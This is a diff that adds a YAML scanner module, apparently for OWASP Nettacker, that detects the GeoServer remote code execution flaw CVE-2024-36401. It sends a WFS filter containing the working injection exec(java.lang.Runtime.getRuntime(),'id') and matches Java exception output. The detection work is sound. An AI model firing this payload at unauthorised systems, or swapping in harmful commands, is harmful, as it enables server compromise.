@@ -1,0 +1,67 @@
+info:
+  name: geoserver_cve_2024_36401
+  author: Gaurav Sharma
+  severity: 9
+  description: >
+    Detects GeoServer Remote Code Execution vulnerability (CVE-2024-36401)
+    via crafted WFS filter injection leading to Java exception disclosure.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-36401
+  classification:
+    cve-id: CVE-2024-36401
+  service:
+    - vuln
+    - http
+  profiles:
+    - vuln
+    - http
+    - critical
+    - geoserver
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: application/xml
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/geoserver/wfs"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 8080
+                - 8081
+        data: |
+          <?xml version="1.0"?>
+          <wfs:GetFeature service="WFS" version="1.0.0"
+          xmlns:wfs="http://www.opengis.net/wfs"
+          xmlns:ogc="http://www.opengis.net/ogc">
+            <wfs:Query typeName="topp:states">
+              <ogc:Filter>
+                <ogc:PropertyIsEqualTo>
+                  <ogc:PropertyName>
+                    exec(java.lang.Runtime.getRuntime(),"id")
+                  </ogc:PropertyName>
+                  <ogc:Literal>test</ogc:Literal>
+                </ogc:PropertyIsEqualTo>
+              </ogc:Filter>
+            </wfs:Query>
+          </wfs:GetFeature>
+        response:
+          condition_type: and
+          conditions:
+            content:
+              regex: java\.lang\.NullPointerException
+              reverse: false
